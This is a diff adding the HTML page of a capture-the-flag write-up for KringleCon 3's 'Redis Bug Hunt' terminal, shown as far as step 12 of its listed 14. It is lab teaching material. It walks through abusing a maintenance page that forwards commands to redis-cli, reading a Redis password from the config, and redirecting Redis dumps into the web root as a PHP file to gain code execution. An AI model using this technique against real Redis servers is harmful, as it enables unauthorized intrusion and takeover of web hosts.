@@ -1,0 +1,1425 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>Terminal/Debug Redis - [Write-up] Kringlecon 3: French Hens</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#redis-bug-hunt" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../../.." title="[Write-up] Kringlecon 3: French Hens" class="md-header-nav__button md-logo" aria-label="[Write-up] Kringlecon 3: French Hens">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            [Write-up] Kringlecon 3: French Hens
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              Terminal/Debug Redis
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="[Write-up] Kringlecon 3: French Hens" class="md-nav__button md-logo" aria-label="[Write-up] Kringlecon 3: French Hens">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    [Write-up] Kringlecon 3: French Hens
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../01-uncover-santas-gift-list/" class="md-nav__link">
+      Objective 01
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../02-investigate-s3-bucket/" class="md-nav__link">
+      Objective 02
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../03-point-of-sale-password-recovery/" class="md-nav__link">
+      Objective 03
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../04-operate-the-santavator/" class="md-nav__link">
+      Objective 04
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../05-open-hid-lock/" class="md-nav__link">
+      Objective 05
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../06-splunk-challenge/" class="md-nav__link">
+      Objective 06
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../07-can-d-bus-problem/" class="md-nav__link">
+      Objective 07
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../08-broken-tag-generator/" class="md-nav__link">
+      Objective 08
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../09-arp-shenanigans/" class="md-nav__link">
+      Objective 09
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../10-defeat-fingerprint-sensor/" class="md-nav__link">
+      Objective 10
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../33.6kbps/" class="md-nav__link">
+      Terminal/33.6kbps
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../can-bus-investigation/" class="md-nav__link">
+      Terminal/CAN Bus Investigations
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Terminal/Debug Redis
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Terminal/Debug Redis
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-01" class="md-nav__link">
+    Step 01
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-02" class="md-nav__link">
+    Step 02
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-03" class="md-nav__link">
+    Step 03
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-04" class="md-nav__link">
+    Step 04
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-05" class="md-nav__link">
+    Step 05
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-06" class="md-nav__link">
+    Step 06
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-07" class="md-nav__link">
+    Step 07
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-08" class="md-nav__link">
+    Step 08
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-09" class="md-nav__link">
+    Step 09
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-10" class="md-nav__link">
+    Step 10
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-11" class="md-nav__link">
+    Step 11
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-12" class="md-nav__link">
+    Step 12
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-13" class="md-nav__link">
+    Step 13
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-14" class="md-nav__link">
+    Step 14
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../elf-code/" class="md-nav__link">
+      Terminal/Elf Code
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../kringle-kiosk/" class="md-nav__link">
+      Terminal/Kringle Kiosk
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../scapy-prepper/" class="md-nav__link">
+      Terminal/Scapy Prepper
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../snowball-fight/" class="md-nav__link">
+      Terminal/Snowball Fight
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../sort-o-matic/" class="md-nav__link">
+      Terminal/Sort-O-Matic
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../speaker-unprep/" class="md-nav__link">
+      Terminal/Speaker Unprep
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../unescape-tmux/" class="md-nav__link">
+      Terminal/Unescape Tmux
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-01" class="md-nav__link">
+    Step 01
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-02" class="md-nav__link">
+    Step 02
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-03" class="md-nav__link">
+    Step 03
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-04" class="md-nav__link">
+    Step 04
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-05" class="md-nav__link">
+    Step 05
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-06" class="md-nav__link">
+    Step 06
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-07" class="md-nav__link">
+    Step 07
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-08" class="md-nav__link">
+    Step 08
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-09" class="md-nav__link">
+    Step 09
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-10" class="md-nav__link">
+    Step 10
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-11" class="md-nav__link">
+    Step 11
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-12" class="md-nav__link">
+    Step 12
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-13" class="md-nav__link">
+    Step 13
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-14" class="md-nav__link">
+    Step 14
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="redis-bug-hunt">Redis Bug Hunt</h1>
+<h2 id="shell">Shell</h2>
+<pre><code class="language-bash">We need your help!!
+
+The server stopped working, all that's left is the maintenance port.
+
+To access it, run:
+
+curl http://localhost/maintenance.php
+
+We're pretty sure the bug is in the index page. Can you somehow use the
+maintenance page to view the source code for the index page?
+player@c3b0b1098583:~$ 
+</code></pre>
+<h2 id="solution">Solution</h2>
+<h3 id="recon">Recon</h3>
+<h4 id="step-01">Step 01</h4>
+<p>Let's first figure out what kind of server we're on</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ netstat -nltu
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN
+tcp6       0      0 :::80                   :::*                    LISTEN
+player@c3b0b1098583:~$
+</code></pre>
+<h4 id="step-02">Step 02</h4>
+<p>It looks like we're running a web server with HTTP (port 80) and a Redis
+database management system (DMBS) (port 6379) open. Since we're trying to find a
+bug with the index page, let's try visiting it</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/index.html
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at localhost Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+player@c3b0b1098583:~$ curl http://localhost/index.php
+Something is wrong with this page! Please use http://localhost/maintenance.php to see if y
+ou can figure out what's going onplayer@c3b0b1098583:~$
+</code></pre>
+<h4 id="step-03">Step 03</h4>
+<p>After trying <code>index.html</code> we can see that we're running an Apache HTTP
+(Debian) server. We can also figure out that the bug is related to <code>index.php</code>. 
+Let's try using the recommended <code>maintenance.php</code> page.</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php
+
+ERROR: 'cmd' argument required (use commas to separate commands); eg:
+curl http://localhost/maintenance.php?cmd=help
+curl http://localhost/maintenance.php?cmd=mget,example1
+
+player@c3b0b1098583:~$
+</code></pre>
+<p>Since the default directory for such an Apache HTTP (Debian) server  is 
+/var/www/html, we can also try to access it.</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ cd /var/www/html
+-bash: cd: /var/www/html: Permission denied
+player@c3b0b1098583:~$ web
+</code></pre>
+<h4 id="step-04">Step 04</h4>
+<p>Following the ERROR's instructions, we can try passing in <code>help</code> into the
+query <code>cmd</code></p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=help
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'help'
+
+redis-cli 5.0.3
+To get help about Redis commands type:
+      &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt;
+      &quot;help &lt;command&gt;&quot; for help on &lt;command&gt;
+      &quot;help &lt;tab&gt;&quot; to get a list of possible help topics
+      &quot;quit&quot; to exit
+To set redis-cli preferences:
+      &quot;:set hints&quot; enable online hints
+      &quot;:set nohints&quot; disable online hints
+Set your preferences in ~/.redisclirc
+player@c3b0b1098583:~$ 
+</code></pre>
+<h4 id="step-05">Step 05</h4>
+<p>It appears that <code>maintenance.php</code> takes in a query string to run as a
+parameter to the <code>redis-cli</code> command on the Redis DBMS. Therefore, we can pass
+in <a href="https://redis.io/commands">valid Redis commands</a>. Let's find out more 
+information about the DBMS to see if there are any additional vulnerabilities
+besides the remote code execution (RCE).</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=info
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'info'
+
+# Server
+redis_version:5.0.3
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:1b271fe49834c463
+redis_mode:standalone
+os:Linux 4.19.0-13-cloud-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:8.3.0
+process_id:6
+run_id:66d01e5b387663e1ee659aff6ef58e6e8cc734d7
+tcp_port:6379
+uptime_in_seconds:1097
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:15550103
+executable:/usr/bin/redis-server
+config_file:/usr/local/etc/redis/redis.conf
+
+# Clients
+connected_clients:1
+client_recent_max_input_buffer:0
+client_recent_max_output_buffer:0
+blocked_clients:0
+
+# Memory
+used_memory:858912
+used_memory_human:838.78K
+used_memory_rss:15196160
+used_memory_rss_human:14.49M
+used_memory_peak:858912
+used_memory_peak_human:838.78K
+used_memory_peak_perc:107.80%
+used_memory_overhead:846566
+used_memory_startup:796760
+used_memory_dataset:12346
+used_memory_dataset_perc:19.86%
+allocator_allocated:1150968
+allocator_active:1388544
+allocator_resident:6008832
+total_system_memory:135198154752
+total_system_memory_human:125.91G
+used_memory_lua:41984
+used_memory_lua_human:41.00K
+used_memory_scripts:0
+used_memory_scripts_human:0B
+number_of_cached_scripts:0
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+allocator_frag_ratio:1.21
+allocator_frag_bytes:237576
+allocator_rss_ratio:4.33
+allocator_rss_bytes:4620288
+rss_overhead_ratio:2.53
+rss_overhead_bytes:9187328
+mem_fragmentation_ratio:19.09
+mem_fragmentation_bytes:14400144
+mem_not_counted_for_evict:0
+mem_replication_backlog:0
+mem_clients_slaves:0
+mem_clients_normal:49694
+mem_aof_buffer:0
+mem_allocator:jemalloc-5.1.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1609385427
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:0
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:6500352
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+
+# Stats
+total_connections_received:4
+total_commands_processed:6
+instantaneous_ops_per_sec:0
+total_net_input_bytes:264
+total_net_output_bytes:30
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:731
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+
+# Replication
+role:master
+connected_slaves:0
+master_replid:54ea0f6166f478e615c25e280b5688fce419d30b
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:0.778839
+used_cpu_user:0.688368
+used_cpu_sys_children:0.000000
+used_cpu_user_children:0.002409
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+db0:keys=2,expires=0,avg_ttl=0
+</code></pre>
+<h4 id="step-06">Step 06</h4>
+<p>We can check out what keys are in database 0 (<code>db0</code>)</p>
+<pre><code class="language-bash">Running: redis-cli --raw -a '&lt;password censored&gt;' 'keys' '*'
+
+example2
+example1
+player@c3b0b1098583:~$ 
+</code></pre>
+<h4 id="step-07">Step 07</h4>
+<p>We can also see what values are associated with the keys <code>example2</code> and
+<code>example1</code></p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=get,example2
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'get' 'example2'
+
+We think there's a bug in index.php
+player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=get,example1
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'get' 'example1'
+
+The site is in maintenance mode
+player@c3b0b1098583:~$ 
+</code></pre>
+<h4 id="step-08">Step 08</h4>
+<p><code>example2</code>'s value confirms that we're looking for a bug in <code>index.php</code>.
+Let's look at the DBMS configuration to see if there's anything valuable.</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,get,*
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'config' 'get' '*'
+
+dbfilename
+dump.rdb
+requirepass
+R3disp@ss
+masterauth
+
+cluster-announce-ip
+
+unixsocket
+
+logfile
+
+pidfile
+/var/run/redis_6379.pid
+slave-announce-ip
+
+replica-announce-ip
+
+maxmemory
+0
+proto-max-bulk-len
+536870912
+client-query-buffer-limit
+1073741824
+maxmemory-samples
+5
+lfu-log-factor
+10
+lfu-decay-time
+1
+timeout
+0
+active-defrag-threshold-lower
+10
+active-defrag-threshold-upper
+100
+active-defrag-ignore-bytes
+104857600
+active-defrag-cycle-min
+5
+active-defrag-cycle-max
+75
+active-defrag-max-scan-fields
+1000
+auto-aof-rewrite-percentage
+100
+stream-node-max-entries
+auto-aof-rewrite-min-size
+67108864
+hash-max-ziplist-entries
+512
+hash-max-ziplist-value
+64
+stream-node-max-bytes
+4096
+stream-node-max-entries
+100
+list-max-ziplist-size
+-2
+list-compress-depth
+0
+set-max-intset-entries
+512
+zset-max-ziplist-entries
+128
+zset-max-ziplist-value
+64
+hll-sparse-max-bytes
+3000
+lua-time-limit
+5000
+slowlog-log-slower-than
+10000
+latency-monitor-threshold
+0
+slowlog-max-len
+128
+port
+6379
+cluster-announce-port
+0
+cluster-announce-bus-port
+0
+tcp-backlog
+511
+databases
+16
+repl-ping-slave-period
+10
+repl-ping-replica-period
+10
+repl-timeout
+60
+repl-backlog-size
+1048576
+repl-backlog-ttl
+3600
+maxclients
+10000
+watchdog-period
+0
+slave-priority
+100
+replica-priority
+100
+slave-announce-port
+0
+replica-announce-port
+0
+min-slaves-to-write
+0
+min-replicas-to-write
+0
+min-slaves-max-lag
+10
+min-replicas-max-lag
+10
+hz
+10
+cluster-node-timeout
+15000
+cluster-migration-barrier
+1
+cluster-slave-validity-factor
+10
+cluster-replica-validity-factor
+10
+repl-diskless-sync-delay
+5
+tcp-keepalive
+300
+cluster-require-full-coverage
+yes
+cluster-slave-no-failover
+no
+cluster-replica-no-failover
+no
+no-appendfsync-on-rewrite
+no
+slave-serve-stale-data
+yes
+replica-serve-stale-data
+yes
+slave-read-only
+yes
+replica-read-only
+yes
+slave-ignore-maxmemory
+yes
+replica-ignore-maxmemory
+yes
+stop-writes-on-bgsave-error
+yes
+daemonize
+no
+rdbcompression
+yes
+rdbchecksum
+yes
+activerehashing
+yes
+activedefrag
+no
+protected-mode
+no
+repl-disable-tcp-nodelay
+no
+repl-diskless-sync
+no
+aof-rewrite-incremental-fsync
+yes
+rdb-save-incremental-fsync
+yes
+aof-load-truncated
+yes
+aof-use-rdb-preamble
+yes
+lazyfree-lazy-eviction
+no
+lazyfree-lazy-expire
+no
+lazyfree-lazy-server-del
+no
+slave-lazy-flush
+no
+replica-lazy-flush
+no
+dynamic-hz
+yes
+maxmemory-policy
+noeviction
+loglevel
+notice
+supervised
+no
+appendfsync
+everysec
+syslog-facility
+local0
+appendonly
+no
+dir
+/
+save
+900 1 300 10 60 10000
+client-output-buffer-limit
+normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60
+unixsocketperm
+0
+slaveof
+
+notify-keyspace-events
+
+bind
+127.0.0.1
+player@c3b0b1098583:~$ 
+</code></pre>
+<h4 id="step-09">Step 09</h4>
+<p>A few things pop out: (1) The DBMS password is <code>R3disp@ss</code>, in case we need
+it, (2) the DBMS current path (<code>dir</code>) is <code>/</code>, and (3) the database name
+(<code>dbfilename</code>) is <code>dump.rdb</code>. </p>
+<h3 id="exploit">Exploit</h3>
+<h4 id="step-10">Step 10</h4>
+<p>In order to view the page source of <code>index.php</code>, we can dump the database on
+a php page accessible via HTTP and use said page to run php functions to print
+out the page source code of <code>index.php</code>. To do so, we need to first move the
+Redis DBMS onto the HTTP server so that we can access it via <code>curl</code>. Since we
+know that we're running an Apache HTTP server on Debian, we can safely assume
+that the web server is hosted in the default <code>/var/www/html</code> directory.
+Therefore, we can change the Redis <code>dir</code> to <code>/var/www/html</code></p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'config' 'set' 'dir' '/var/www/html'
+
+OK
+player@c3b0b1098583:~$ 
+</code></pre>
+<h4 id="step-11">Step 11</h4>
+<p>We then need to have load the Redis database onto a php page so that we can
+run php commands</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=config,set,dbfilename,dump.php
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'config' 'set' 'dbfilename' 'dump.php'
+
+OK
+player@c3b0b1098583:~$
+</code></pre>
+<h4 id="step-12">Step 12</h4>
+<p>Now, after saving our changes, we should be able to <code>GET</code> the database php page</p>
+<pre><code class="language-bash">player@c3b0b1098583:~$ curl http://localhost/maintenance.php?cmd=save 
+Running: redis-cli --raw -a '&lt;password censored&gt;' 'save'
+OK
+player@c3b0b1098583:~$ curl http://localhost/dump.php --output -
+REDIS0009�      redis-ver5.0.3�
+�edis-bits�@�ctime�(K�_used-mem� 
+ aof-preamble���example2#We think there's a bug in index.phexample1The site is in maintena
+nce mode�����A���player@c3b0b1098583:~$ 
